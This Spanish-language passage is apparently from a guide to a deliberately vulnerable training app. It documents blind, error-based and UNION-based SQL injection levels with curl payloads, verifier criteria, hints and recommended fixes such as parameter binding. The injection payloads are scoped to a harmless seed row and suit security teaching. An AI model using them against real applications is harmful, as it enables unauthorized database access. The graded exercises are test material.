Está marcado Variant.SECURE. Un payload no numérico puede causar NumberFormatException y terminar en una respuesta de error del framework; eso no equivale a una inyección SQL ni debe contarse como éxito del ejercicio.

#### `GET /VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Concatena id en `select * from cars where id=` + id. Si encuentra una fila serializa id, name e image dentro de carInformation; si falla, devuelve HTTP 200 con un cuerpo tipo JSON que incorpora `moreInfo` y ex.getMessage().

UNSECURE y error-based. Los tests prueban tanto la lectura controlada de BMW mediante una condición OR como que una conversión o sintaxis inválida deja un mensaje de base de datos en moreInfo. La exposición del mensaje es una fuga de información además de la inyección; no se debe interpretar como acceso al host.

#### `GET /VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_2`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Concatena id entre comillas en `select * from cars where id='` + id + `'`. Devuelve los datos serializados de la primera fila, false si no hay fila, o HTTP 200 con moreInfo y el mensaje de la excepción si la consulta falla.

UNSECURE. Los tests de base de datos verifican que una variante con comillas puede seleccionar BMW y que `1'` expone el error SQL. El ejercicio evita la tabla users y solo utiliza la fila conocida de cars.

#### `GET /VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_3`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Elimina todas las comillas simples de id y luego concatena el valor en una consulta que sigue usando comillas alrededor del parámetro. Devuelve carInformation o un cuerpo con moreInfo ante error.

La anotación no declara Variant.SECURE y el código mantiene una consulta construida por concatenación y una respuesta de error detallada. Los tests indican que el payload de unión/OR ya no fuga BMW ni usuarios, pero también indican que los errores siguen reflejando el input (por ejemplo, abc); por honestidad se clasifica como nivel no seguro con mitigación parcial, no como bypass demostrado.

#### `GET /VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_4`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Elimina comillas y crea un PreparedStatement, pero inserta id ya concatenado en `select * from cars where id='` + id + `'`; el setter no enlaza ningún placeholder. Devuelve carInformation o moreInfo con el error.

La anotación no declara Variant.SECURE. Crear el objeto PreparedStatement no parametriza la consulta; los tests muestran que los payloads de unión no leen BMW con esta semilla, pero el mensaje de conversión aún se entrega al cliente. El hallazgo seguro verificable es la divulgación de errores y la falta de un binding real.

#### `GET /VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_5`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Usa `select * from cars where id=?` y setString. Devuelve JSON con la fila si existe, false para una fila ausente y false sin moreInfo detallado si ocurre una excepción.

Está marcado Variant.SECURE. El test de base de datos prueba que OR, comillas, CAST, UNION y valores no numéricos no devuelven BMW, usuarios ni mensajes internos. Un 200 por sí solo no prueba seguridad; se requiere comparar contenido y comportamiento con un control conocido.

#### `GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Concatena id en `select * from cars where id=` + id y mapea la primera fila a CarInformation, serializada como JSON por Spring. La fila puede provenir de una unión adicional.

UNSECURE. El test de base de datos prueba una UNION numérica contra la tabla users; el ejercicio seguro sustituye users por cars y selecciona únicamente BMW, una fila de entrenamiento conocida. Si no hay fila, el mapper puede devolver un objeto vacío con HTTP 200; no se debe usar ese estado como único verificador.

#### `GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_2`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Concatena id entre comillas en `select * from cars where id='` + id + `'` y mapea la primera fila a CarInformation. Una comilla en el valor puede cerrar el literal y añadir una UNION.

UNSECURE. Los tests originales usan la tabla users para demostrar la fuga, pero este informe no la consulta: el ejercicio utiliza `SELECT id,name,image FROM cars WHERE id=2`, con columnas conocidas y sin efectos laterales.

#### `GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_3`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Elimina comillas simples y concatena el resultado dentro de un literal SQL. La respuesta sigue siendo un CarInformation HTTP 200 cuando el driver devuelve una fila.

Está marcado Variant.SECURE. La mitigación de eliminación de comillas no es una defensa general recomendable, pero los tests de base de datos no observan fuga de BMW ni de users con los payloads usados; la defensa robusta de los niveles siguientes es binding de parámetros.

#### `GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_4`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Ejecuta `select * from cars where id=?` y enlaza id mediante PreparedStatementSetter; el resultado se convierte a CarInformation.

Está marcado Variant.SECURE. La entrada no modifica la consulta. Para valores no convertibles el driver puede responder con error; el test solo exige que no se devuelva una fila de BMW o de users.

#### `GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_5`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Usa NamedParameterJdbcTemplate con `select * from cars where id=:id` y MapSqlParameterSource; BeanPropertyRowMapper crea el CarInformation.

Está marcado Variant.SECURE. El valor se enlaza como parámetro nombrado y no se concatena en el SQL. Un id inexistente puede producir una excepción de queryForObject según la configuración; eso es una diferencia de manejo de ausencia, no una prueba de inyección.

#### `GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_6`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Construye el JPQL fijo `from CarInformation where id = :id`, convierte id a Integer y lo enlaza con TypedQuery.setParameter.

Está marcado Variant.SECURE. Un texto como `999 OR id=2` falla en Integer.valueOf antes de consultar; el test espera NumberFormatException para ese caso. El 500 resultante puede ser ruidoso, pero no demuestra SQLi.

#### `GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_7`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Usa CriteriaBuilder/CriteriaQuery y compara el atributo id con el parámetro recibido, sin insertar id en texto SQL o JPQL. Devuelve el CarInformation de la consulta.

Está marcado Variant.SECURE. El test de base de datos prueba id válido y payloads de OR/UNION sin fuga. La conversión/coerción de tipos del proveedor JPA puede cambiar el estado HTTP ante entradas no numéricas, por lo que el check seguro se limita a ausencia del marcador BMW.

#### `GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_8`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Ejecuta la NamedQuery `findById` de CarInformation (`select c from CarInformation c where c.id=:id`) y convierte id con Integer.valueOf antes de setParameter.

Está marcado Variant.SECURE. Un payload con comillas o UNION falla en la conversión antes de llegar al JPQL; el test espera NumberFormatException para una unión entrecomillada.

#### `GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_9`

**Entrada:** {
  "id": {
    "in": "query",
    "required": true,
    "type": "string"
  }
}

Convierte id a Integer y llama a CarInformationRepository.findById. Devuelve HTTP 200 con la entidad encontrada o HTTP 404 cuando no existe.

Está marcado Variant.SECURE. El test espera 404 para id 999 y NumberFormatException para una UNION numérica; la consulta deriva de Spring Data y no permite insertar SQL en el valor.

### sqlInjection-01 · Blind L1: comparar un control falso con una condición siempre verdadera

Verificación estática y tests predicen que el control de id inexistente devuelve isCarPresent=false y que el segundo valor puede devolver isCarPresent=true porque altera el WHERE. Ambos suelen ser HTTP 200; no se promete el resultado del target sin ejecutarlo.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El nivel concatena id sin comillas en una consulta numérica. Se usa 100, que no necesita existir, y una expresión booleana sin escribir ni modificar datos. El marcador true/false es el oráculo ciego previsto por el controlador.

```bash
curl -i --get http://target:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1 --data-urlencode 'id=999'
```

```bash
curl -i --get http://target:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1 --data-urlencode 'id=100 OR 2=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar los dos cuerpos JSON: el control debe ser false y el payload debe cambiar a true. Un 200, por sí solo, no demuestra la inyección."
}
```

**Pistas:**

Primero establece el comportamiento normal con un id que no aparece en la semilla.

La respuesta no expone una fila: observa solamente el cambio de isCarPresent.

No uses tiempos de espera ni funciones de base de datos; la comparación booleana basta.

**Corrección recomendada:** Usar PreparedStatement con `where id=?`, validar el tipo como número y devolver un error genérico sin detalles de la base de datos.

### sqlInjection-02 · Blind L2: salir de un literal entrecomillado con un marcador booleano

Según la consulta observada y el payload de la propiedad, el control debe ser false y la variante con comillas puede ser true. Una respuesta de error para alguno de los dos valores es una incertidumbre de dialecto/driver, no un éxito automático.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El código envuelve id entre comillas simples. El payload cierra el literal, añade una condición verdadera y deja un literal final para equilibrar la consulta; sigue limitado a la tabla cars.

```bash
curl -i --get http://target:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_2 --data-urlencode 'id=999'
```

```bash
curl -i --get http://target:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_2 --data-urlencode "id=100' OR '1'='1"
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar isCarPresent del control y del payload; exigir true/false coherentes y registrar también el estado HTTP. No puntuar por una mera respuesta 200."
}
```

**Pistas:**

El control debe ser un id ausente, no un id existente.

La consulta fuente ya aporta las comillas de apertura y cierre.

Si el driver devuelve error, conserva esa observación y no la conviertas en una afirmación de explotación exitosa.

**Corrección recomendada:** No eliminar comillas como defensa principal; enlazar el valor con un parámetro y aplicar validación de tipo antes de consultar.

### sqlInjection-03 · Blind L3: control de parámetro preparado contra una expresión OR

El control debe indicar true para Audi. El payload se trata como texto; por ello no debería seleccionar BMW y puede devolver false o un error de conversión del driver. El test de base de datos considera el nivel no inyectable.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El nivel usa un placeholder y setString, de modo que los operadores incluidos en id no se incorporan al SQL. El primer request es el control positivo funcional y el segundo es el control negativo de inyección.

```bash
curl -i --get http://target:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_3 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_3 --data-urlencode 'id=999 OR id=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Confirmar que el control devuelve true y que el cuerpo del payload no cambia a true por BMW; revisar el cuerpo, no solamente el código HTTP."
}
```

**Pistas:**

Usa Audi como control positivo conocido por la semilla.

La presencia de OR en el texto no debe alterar la consulta preparada.

Una ausencia de BMW es evidencia acotada a este marcador y esta semilla, no una auditoría completa.

**Corrección recomendada:** Mantener el binding de parámetros y no volver a concatenar el valor para construir SQL.

### sqlInjection-04 · Blind L4: comprobar el rechazo por validación numérica

El código predice HTTP 400 y el texto `Invalid ID format.` porque la comilla no satisface \d+; no se debería ejecutar la consulta.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Es una comprobación negativa de una entrada con metacarácter SQL. El control no necesita extraer filas; solo verifica que la validación ocurre antes de la concatenación.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request sqlInjection-04 --method GET --param 'id=1'"'"'' --header Accept=application/json
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "Invalid ID format.",
  "status": 400
}
```

**Pistas:**

El texto esperado es el cuerpo de la rama HTTP 400.

No confundas un rechazo por validación con una prueba de que todo el sistema es seguro.

Repite con id=1 si necesitas el control funcional, pero no uses solo su 200 como verificador.

**Corrección recomendada:** Conservar la validación como defensa adicional, pero usar además una consulta parametrizada y límites razonables de entrada.

### sqlInjection-05 · Blind L5: conversión entera y acceso JPA como control defensivo

El control debe producir isCarPresent=true para Audi. El payload no es un entero; Integer.parseInt puede causar una respuesta de error del framework y nunca debería seleccionar BMW. El estado exacto del error no está fijado por este controlador.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La conversión se ejecuta antes de EntityManager.find. Es un contraste útil con L1, pero el comportamiento del error de NumberFormatException depende del manejador global.

```bash
curl -i --get http://target:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_5 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_5 --data-urlencode 'id=999 OR id=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Verificar true para id=1 y ausencia del marcador BMW en el segundo cuerpo; no considerar un 500 como prueba de seguridad ni como prueba de explotación."
}
```

**Pistas:**

La respuesta del primer request es el control positivo.

El segundo request prueba que el texto no llega como JPQL/SQL ejecutable.

Documenta por separado la validación de entrada y el código de estado.

**Corrección recomendada:** Convertir de forma controlada, responder 400 ante entrada inválida y mantener APIs JPA parametrizadas sin filtrar trazas.

### sqlInjection-06 · Error L1: observar divulgación controlada de error SQL

El control debería devolver isCarPresent=true y Audi. Para `1'`, los tests predicen un cuerpo con moreInfo y un mensaje de sintaxis de la base de datos; la forma exacta del mensaje depende del driver instalado.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La vulnerabilidad de error-based se demuestra de forma inocua mediante un error sintáctico, sin enumerar tablas ni extraer secretos. El método incluye ex.getMessage() en la respuesta.

```bash
curl -i --get http://target:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1 --data-urlencode "id=1'"
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "moreInfo"
}
```

**Pistas:**

El control establece que la ruta y la semilla funcionan.

Busca moreInfo en el cuerpo, no una cadena de error específica del motor.

No uses el payload original de CAST ni consultas contra users: no son necesarios para comprobar la fuga de errores.

**Corrección recomendada:** Capturar errores internamente, registrar un identificador correlacionable y devolver un mensaje genérico; parametrizar la consulta y validar id.

### sqlInjection-07 · Error L1: condición OR que devuelve la fila de entrenamiento BMW

Con la semilla de tests, la consulta concatenada puede devolver la fila cars.id=2 y el JSON debería contener name BMW. No se afirma que el target esté sembrado igual ni que el request se haya ejecutado.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La respuesta de error-based serializa la fila completa, por lo que una alteración booleana deja un marcador visible y no solo un true/false. BMW es un dato de entrenamiento no sensible en la semilla.

```bash
curl -i --get http://target:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1 --data-urlencode 'id=999 OR id=2'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request sqlInjection-07 --method GET --param 'id=999 OR id=2' --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "BMW"
}
```

**Pistas:**

El 999 evita depender de una fila original.

id=2 es BMW en scripts/SQLInjection/db/data.sql.

Que aparezca BMW confirma el efecto en esta semilla; no prueba lectura de otras tablas ni del host.

**Corrección recomendada:** Usar binding de parámetros, permitir únicamente identificadores válidos y no devolver la entidad completa cuando el caso de uso solo necesita existencia.

### sqlInjection-08 · Error L2: UNION entrecomillada limitada a la tabla cars

Según los tests, la variante entrecomillada puede seleccionar BMW y serializarlo. La ruta puede variar en estado HTTP si el driver o la semilla de target difieren.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El nivel 2 rodea id con comillas simples. El valor cierra y vuelve a abrir el literal de forma que la condición busque la fila 2; no se usa UNION ni se toca users.

```bash
curl -i --get http://target:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_2 --data-urlencode "id=999' OR id='2"
```

Registrar la misma prueba con el cliente del laboratorio:
lab request sqlInjection-08 --method GET --param 'id=999'"'"' OR id='"'"'2' --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "BMW"
}
```

**Pistas:**

El payload de la propiedad original usa la misma idea de romper el literal.

Mantén la prueba en cars y comprueba solo BMW.

Si aparece moreInfo, registra el error pero no concluyas que hubo fuga de otra tabla.

**Corrección recomendada:** Parametrizar la consulta; no confiar en reemplazar caracteres y no exponer excepciones al cliente.

### sqlInjection-09 · Error L3: comprobar el límite de eliminar comillas

El test de base de datos predice que la sustitución de comillas impide devolver BMW con este payload. Un valor no numérico como abc puede producir moreInfo que solo refleje abc; el estado exacto puede depender del driver.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

Es un control negativo frente a L2. También ilustra que un filtro puntual no es igual a parametrizar: el código sigue concatenando y la respuesta sigue revelando errores.

```bash
curl -i --get http://target:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_3 --data-urlencode "id=999' OR id='2"
```

Registrar la misma prueba con el cliente del laboratorio:
lab request sqlInjection-09 --method GET --param 'id=999'"'"' OR id='"'"'2' --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "BMW"
}
```

**Pistas:**

La comprobación es ausencia de BMW, no un 200.

El test original separa no-fuga de tabla y divulgación del error; conserva ambas observaciones.

No llames a este nivel completamente seguro porque la anotación no es Variant.SECURE.

**Corrección recomendada:** Reemplazar la concatenación y el filtro de comillas por PreparedStatement real, y ocultar el mensaje de excepción.

### sqlInjection-10 · Error L4: demostrar que preparar una consulta ya concatenada no basta

El test predice que no se devuelve BMW porque las comillas se eliminan antes de crear el PreparedStatement, pero el código no enlaza ningún placeholder y mantiene la divulgación de errores.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

El nombre PreparedStatement puede inducir a error: la cadena SQL se completa con id antes de preparar y el setter es vacío. El ejercicio verifica el límite de esa pseudo-mitigación sin consultar datos sensibles.

```bash
curl -i --get http://target:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_4 --data-urlencode "id=999' OR id='2"
```

Registrar la misma prueba con el cliente del laboratorio:
lab request sqlInjection-10 --method GET --param 'id=999'"'"' OR id='"'"'2' --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "BMW"
}
```

**Pistas:**

Compara este comportamiento con Error L2 y observa que el test de código verifica un setter vacío.

No uses un 200 como criterio suficiente.

Un cuerpo con moreInfo sigue siendo un hallazgo aunque no contenga BMW.

**Corrección recomendada:** Construir `select * from cars where id=?` como SQL fijo y llamar a setString/setInt para el valor; separar el mensaje público del log interno.

### sqlInjection-11 · Error L5: control positivo y payload OR contra binding real

El control debe devolver Audi y isCarPresent=true. El payload debe tratarse como valor literal: los tests esperan isCarPresent=false y que no aparezcan BMW, usuarios ni moreInfo de la base de datos.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este contraste muestra el mismo uso funcional de la ruta con dos valores y separa éxito de negocio (Audi) de resistencia a inyección (payload literal).

```bash
curl -i --get http://target:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_5 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_5 --data-urlencode 'id=999 OR id=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Confirmar Audi en el control y ausencia de BMW/moreInfo en el payload; el check no atribuye seguridad por el código HTTP."
}
```

**Pistas:**

Audi es la fila 1 de la semilla y funciona como control positivo.

BMW es el marcador de que la condición OR habría alterado la selección.

La ausencia de moreInfo es tan importante como la ausencia de BMW.

**Corrección recomendada:** Mantener la consulta parametrizada, validar id y responder 400 ante valores no válidos en vez de depender de excepciones.

### sqlInjection-12 · Union L1: UNION segura sobre cars para devolver BMW

Con la semilla de scripts/SQLInjection/db/data.sql, la unión puede hacer que la primera fila mapeada sea BMW y que el JSON contenga name BMW e image de BMW. No se consulta users.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El endpoint concatena directamente id y el SELECT adicional tiene exactamente tres columnas compatibles con cars. Es una prueba de lectura de una fila de entrenamiento conocida, sin modificación ni enumeración de secretos.

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1 --data-urlencode 'id=999 UNION SELECT id,name,image FROM cars WHERE id=2'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request sqlInjection-12 --method GET --param 'id=999 UNION SELECT id,name,image FROM cars WHERE id=2' --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "BMW"
}
```

**Pistas:**

Las tres columnas deben corresponder a id, name e image.

999 evita que una fila original gane la posición que se mapea.

El payload original documenta users, pero este ejercicio deliberadamente usa solo cars.

**Corrección recomendada:** Usar `where id=?` con binding y no permitir que el cliente controle fragmentos de SELECT, UNION, ORDER BY o nombres de tabla.

### sqlInjection-13 · Union L2: UNION entrecomillada limitada a cars

Según el código y el patrón de test, la cadena puede cerrar el literal y devolver BMW en el objeto mapeado. El estado o cuerpo real debe verificarse en el target y no se promete aquí.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Es la variante con literal del ejercicio anterior. La condición final falsa evita traer accidentalmente filas adicionales y mantiene el alcance en id=2 de cars.

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_2 --data-urlencode "id=999' UNION SELECT id,name,image FROM cars WHERE id=2 OR '1'='2"
```

Registrar la misma prueba con el cliente del laboratorio:
lab request sqlInjection-13 --method GET --param 'id=999'"'"' UNION SELECT id,name,image FROM cars WHERE id=2 OR '"'"'1'"'"'='"'"'2' --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "BMW"
}
```

**Pistas:**

La ruta añade sus propias comillas alrededor del parámetro.

El nombre BMW es un marcador controlado, no una lectura de información privada.

Si el driver rechaza el SQL, registra la incertidumbre de dialecto en vez de cambiar el payload a una operación destructiva.

**Corrección recomendada:** Parametrizar id; eliminar la posibilidad de que la entrada aporte comillas, operadores o SELECT secundarios; no confiar en escape manual.

### sqlInjection-14 · Union L3: control negativo después de eliminar comillas

El control debe devolver Audi. El payload pierde las comillas antes de formar la consulta y, según el test, no debe devolver BMW; puede producir objeto vacío o error según el driver.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Contrasta el nivel vulnerable entrecomillado con su filtro puntual. La anotación marca el nivel como SECURE, pero la mitigación recomendada sigue siendo binding, no una lista de reemplazos.

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_3 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_3 --data-urlencode "id=999' UNION SELECT id,name,image FROM cars WHERE id=2"
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Verificar Audi en el control y ausencia del texto BMW en el payload; una respuesta 200 vacía no demuestra por sí sola que el filtro sea una defensa suficiente."
}
```

**Pistas:**

El control confirma que el mapper funciona.

Compara el cuerpo completo, no solo el estado HTTP.

La ausencia de BMW es un control de no-fuga acotado a la semilla.

**Corrección recomendada:** Sustituir la eliminación de comillas por PreparedStatement y validar el tipo del identificador.

### sqlInjection-15 · Union L4: PreparedStatement con valor de unión como dato

El control debe devolver Audi. El payload se enlaza al placeholder y no debe devolver BMW; puede terminar en error de conversión o respuesta vacía según el driver.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El SQL es fijo y el texto de UNION viaja como valor del parámetro. Es el patrón de defensa que faltaba en los primeros niveles.

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_4 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_4 --data-urlencode 'id=999 UNION SELECT id,name,image FROM cars WHERE id=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Confirmar que el control funciona y que el segundo cuerpo no contiene BMW; no exigir un código 200 concreto porque el controlador no define el mapeo de errores del driver."
}
```

**Pistas:**

El test de código verifica que la consulta contiene `?` y un setter.

No uses `;` ni una segunda sentencia: la UNION de cars es suficiente.

Un error sin BMW no debe marcarse como fuga.

**Corrección recomendada:** Mantener binding, usar validación de entero cuando el dominio lo permita y convertir errores de conversión en 400 genérico.

### sqlInjection-16 · Union L5: parámetro nombrado frente a UNION

El control debe devolver Audi. El payload se enlaza al parámetro nombrado `:id` y no debe devolver BMW; queryForObject puede representar una entrada inválida mediante excepción.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

NamedParameterJdbcTemplate separa texto SQL y valor de id. La prueba repite el mismo marcador que L4 para aislar la diferencia de API.

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_5 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_5 --data-urlencode 'id=999 UNION SELECT id,name,image FROM cars WHERE id=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Revisar que Audi aparece solo en el control y que el payload no contiene BMW; anotar por separado cualquier 4xx/5xx del framework."
}
```

**Pistas:**

El test unitario inspecciona que el valor de id llega a MapSqlParameterSource.

No confundas excepción por fila ausente con inyección.

La ausencia de BMW es el marcador útil para esta prueba.

**Corrección recomendada:** Continuar usando parámetros nombrados y manejar de forma explícita ausencia y conversión, sin incluir detalles de SQLException en respuestas.

### sqlInjection-17 · Union L6: Integer.valueOf antes de JPQL

El control debe devolver Audi. El payload no es entero y el test predice NumberFormatException antes de la consulta; el estado HTTP final depende del manejador global.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La consulta JPQL usa un parámetro y el método convierte el identificador antes de crearla. Se prueba la frontera de tipo con una expresión booleana sin efectos.

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_6 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_6 --data-urlencode 'id=999 OR id=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Confirmar Audi en el control y ausencia de BMW en la respuesta del payload; no convertir un 500 por validación en una afirmación de explotación o de seguridad total."
}
```

**Pistas:**

La prueba es de tipo y binding, no de ejecución de una UNION.

La semilla usa Audi como id=1.

Observa el cuerpo y logs permitidos del laboratorio, sin pedir secretos del host.

**Corrección recomendada:** Validar y convertir con respuesta 400 controlada; conservar parámetros JPQL y no exponer stack traces.

### sqlInjection-18 · Union L7: CriteriaQuery no concatena el id

El control debe devolver Audi. El CriteriaQuery se construye con la API de criterios y no debe devolver BMW para el texto de UNION; el proveedor JPA puede responder con error de tipo.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El id se pasa como valor a CriteriaBuilder.equal, no como fragmento de consulta. El payload permanece inocuo y solo intenta comprobar si existe concatenación.

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_7 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_7 --data-urlencode 'id=999 UNION SELECT id,name,image FROM cars WHERE id=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar ambos cuerpos y confirmar que BMW no aparece en el payload; registrar el código HTTP sin usarlo como único criterio."
}
```

**Pistas:**

El test de base de datos prueba ausencia de BMW y de usuarios para payloads equivalentes.

No uses una entrada que modifique datos.

La comparación debe centrarse en el valor retornado, no en hacer click en la UI.

**Corrección recomendada:** Mantener la API de criterios o consultas parametrizadas y validar el tipo de id con un error 400 claro.

### sqlInjection-19 · Union L8: NamedQuery y conversión de identificador

El control debe devolver Audi. La entrada con comillas no pasa Integer.valueOf y el test predice NumberFormatException, sin una fila BMW; el código HTTP depende del manejador global.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La NamedQuery está declarada en CarInformation y el valor se enlaza con setParameter después de convertirlo a entero.

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_8 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_8 --data-urlencode "id=999' UNION SELECT id,name,image FROM cars WHERE id=2"
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Verificar Audi en el control y ausencia de BMW en el payload; documentar si la validación se presenta como 4xx o 5xx."
}
```

**Pistas:**

La comilla hace que el payload no sea un entero.

No necesitas conocer la tabla users para verificar esta defensa.

La ausencia de BMW es el resultado observable seguro.

**Corrección recomendada:** Convertir con manejo explícito, responder 400 para entradas inválidas y conservar la NamedQuery parametrizada.

### sqlInjection-20 · Union L9: repositorio Spring Data y 404 controlado

El control debe devolver Audi; id=999 debe devolver 404 según el test; el payload no entero puede terminar en NumberFormatException y nunca debería devolver BMW. El estado de una excepción no está fijado por este JSON.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El método convierte id a Integer y delega en findById. El triple contraste separa fila válida, ausencia normal y entrada no numérica.

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_9 --data-urlencode 'id=1'
```

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_9 --data-urlencode 'id=999'
```

```bash
curl -i --get http://target:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_9 --data-urlencode 'id=999 OR id=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
